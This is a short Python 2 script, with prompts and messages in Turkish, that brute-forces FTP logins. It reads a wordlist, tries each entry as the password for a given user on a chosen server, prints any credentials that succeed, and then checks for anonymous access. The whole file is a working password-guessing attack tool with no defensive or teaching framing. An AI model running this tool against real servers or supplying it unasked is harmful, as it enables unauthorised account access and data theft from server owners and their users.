import sys
from ftplib import FTP

def checkAnonymous(dstIP):
   try:
      ftp = FTP(dstIP)
      ftp.login()
      print "[*] Anonymous giris acik"
      print "[*] Kullanici Adi : anonymous"
      print "[*] Parola        : anonymous"
      ftp.close()
   except:
      pass

def ftpLogin(dstIP, user, passw):
   try:
      ftp = FTP(dstIP)
      ftp.login(user, passw)
      ftp.quit()
      print "[!] Kullanici/Parola bulundu."
      print "[!] Kullanici Adi : " + user
      print "[!] Parola        : " + passw
      sys.exit(0)
   except:
      pass

def bruteForce(dstIP, user, wordL):
   try:
      wordlist = open(wordL, "r")
      words = wordlist.readlines()
      for word in words:
         word = word.strip()
         ftpLogin(dstIP, user, word)
   except:
      print "[-] Eslesen parola bulunamadi.."
      sys.exit(0)

dstIP = raw_input("FTP sunucu adresi : ")
user = raw_input("Kullanici adi : ")
wordlist = raw_input("Parola listesi : ")

bruteForce(dstIP, user, wordlist)
checkAnonymous(dstIP)
